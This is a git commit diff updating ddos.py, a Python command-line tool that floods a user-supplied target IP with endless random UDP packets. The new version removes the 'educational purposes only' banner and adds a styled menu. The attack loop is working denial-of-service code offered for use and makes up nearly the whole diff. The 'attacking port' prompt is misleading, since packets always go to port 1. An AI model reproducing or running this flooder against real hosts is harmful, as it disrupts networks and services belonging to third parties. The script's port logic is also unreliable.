a03786ff967a23eda0721b8bbd943144bd079508
Zombie <158185295+ZombieGeeK0@users.noreply.github.com>
2024-03-21 10:14:26 +0100

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,30 +1,49 @@
-# THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY
-import os
-import time
-import socket
-import random
+import os, socket, time, random, datetime
+from colorama import Fore
 
-print()
-print('    | DDoS Tool by → copy-and-execute (github.com/copy-and-execute/)')
-print('    | → This tool is only for educational purposes. Do not use this for illegal purposes.')
-print('    | → You are responsible for all actions you perform with this code/tool.')
+class color:
+    RED = Fore.RED
+    RESET = Fore.RESET
 
-mydate = time.strftime('%Y-%m-%d')
-mytime = time.strftime('%H-%M')
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-ip = input("    | Target IP → ")
-print("    | Attacking on →", ip, "...")
+date = hora = datetime.datetime.now() 
+hostname = socket.gethostname()
+ip = socket.gethostbyname(hostname)
 
-time.sleep(2.5)
-sent = 0
-while True:
-    sock.sendto(bytes, (ip, 1))
-    sent = sent + 1
-    port = 80 # You can edit your attacking port here
-    print("    | Sent Packet → %s through %s:%s" % (sent, ip, port))
-    if port == 65534:
-        port = 1
+def clear():
+  if os.name == "nt":
+    os.system("cls")
+  else:
+    os.system("clear")
 
-os.system("cls")
-input("Press Enter to exit...")
+def menu():
+    clear()
+    title = f'''
+██████╗ ██████╗  ██████╗ ███████╗  [-] Copyright ©2024 By ZombieGeek0
+██╔══██╗██╔══██╗██╔═══██╗██╔════╝  [-] GitHub: https://www.github.com/ZombieGeek0/SimpleDDOS
+██║  ██║██║  ██║██║   ██║███████╗  [-] Hostname: {hostname}
+██║  ██║██║  ██║██║   ██║╚════██║  [-] IP: {ip}
+██████╔╝██████╔╝╚██████╔╝███████║  [-] Date: {date}
+╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝                                 
+'''
+    print(color.RED + title)
+
+    mydate = time.strftime('%Y-%m-%d')
+    mytime = time.strftime('%H-%M')
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    ip = input(f"{color.RED}[-] Target IP: ")
+    port = input(f'{color.RED}[-] Enter your attacking port: ')
+    print(f"{color.RED}[-] Attacking on: {ip} and port {port} at time {date}...\n")
+    
+    time.sleep(2.5)
+    sent = 0
+    
+    while True:
+        sock.sendto(bytes, (ip, 1))
+        sent = sent + 1
+        print(f"    | [ Sent Packet: {sent} through {ip}:{port} at time {date} ]")
+        if port == 65534:
+            port = 1
+    
+    clear()
+    input("\n[-] Press the ENTER key to exit: ")
